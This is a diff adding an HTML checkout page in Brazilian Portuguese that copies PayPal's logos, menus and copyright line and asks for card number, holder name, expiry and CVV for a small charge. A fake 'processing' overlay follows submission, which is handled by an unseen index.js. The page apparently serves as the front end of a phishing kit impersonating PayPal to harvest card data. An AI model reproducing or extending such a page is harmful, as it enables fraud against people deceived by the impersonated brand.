@@ -1,0 +1,108 @@
+<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Checkout Personalizado</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+  <div class="nav-container">
+    <div class="logo"></div>
+    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="Logo" style="height:30px;">
+    <nav>
+      <ul class="nav-links">
+        <li><a href="#">Início</a></li>
+        <li><a href="#">Como funciona</a></li>
+        <li><a href="#">Cadastrar</a></li>
+        <li><a href="#">Ajuda</a></li>
+        <li><a href="#">Suporte</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+  <main>
+    <form id="checkoutForm" method="post"novalidate>
+      <img class="logo" src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+      <h2>Checkout PayPal</h2>
+      <p class="total">Total: R$12,90</p>
+        <div class="card-flags">
+    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+    <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
+    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
+    <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+  </div>
+      <label for="numero_cartao">Número do Cartão</label>
+  <input type="number" id="numero_cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" required>
+
+  <label for="nome_titular">Nome do Titular</label>
+  <input type="text" id="nome_titular" name="nome_titular" placeholder="JOÃO DA SILVA" required>
+
+  <div class="input-row">
+    <div>
+      <label for="validade">Validade</label>
+      <input type="number" id="validade" name="validade" placeholder="MM/AA" required>
+    </div>
+    <div>
+      <label for="cvv">CVV</label>
+      <input type="number" id="cvv" name="cvv" placeholder="123" required>
+    </div>
+  </div>
+
+  <label for="tipo_cartao">Tipo de Cartão</label>
+  <input list="tipos" id="tipo_cartao" name="tipo_cartao" placeholder="Crédito ou Débito" required>
+  <datalist id="tipos">
+    <option value="Crédito">
+    <option value="Débito">
+  </datalist>
+
+  <label for="cupom">Cupom</label>
+  <input type="text" id="cupom" name="cupom" placeholder="Opcional">
+
+  <button type="submit">Pagar agora</button>
+</form>
+
+  </main>  <div class="overlay" id="overlay">
+    <div class="popup" id="popupContent">
+      <div class="loader"></div>
+      Processando seu pagamento...
+    </div>
+  </div>
+  <footer>
+  <div class="footer-container">
+    <div class="footer-logo">
+      <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal">
+    </div>
+    <div class="footer-menus">
+      <div class="footer-column">
+        <h4>Produtos</h4>
+        <a href="#">Pagar com PayPal</a>
+        <a href="#">Receber pagamentos</a>
+        <a href="#">Soluções para empresas</a>
+      </div>
+      <div class="footer-column">
+        <h4>Suporte</h4>
+        <a href="#">Central de ajuda</a>
+        <a href="#">Fale conosco</a>
+        <a href="#">Resolução de problemas</a>
+      </div>
+      <div class="footer-column">
+        <h4>Institucional</h4>
+        <a href="#">Sobre o PayPal</a>
+        <a href="#">Carreiras</a>
+        <a href="#">Investidores</a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <p>&copy; 2025 PayPal. Todos os direitos reservados.</p>
+    <div class="footer-links-inline">
+      <a href="#">Privacidade</a>
+      <a href="#">Termos de uso</a>
+      <a href="#">Acessibilidade</a>
+    </div>
+  </div>
+</footer>
+  <script src="index.js"></script>
+</body>
+</html>
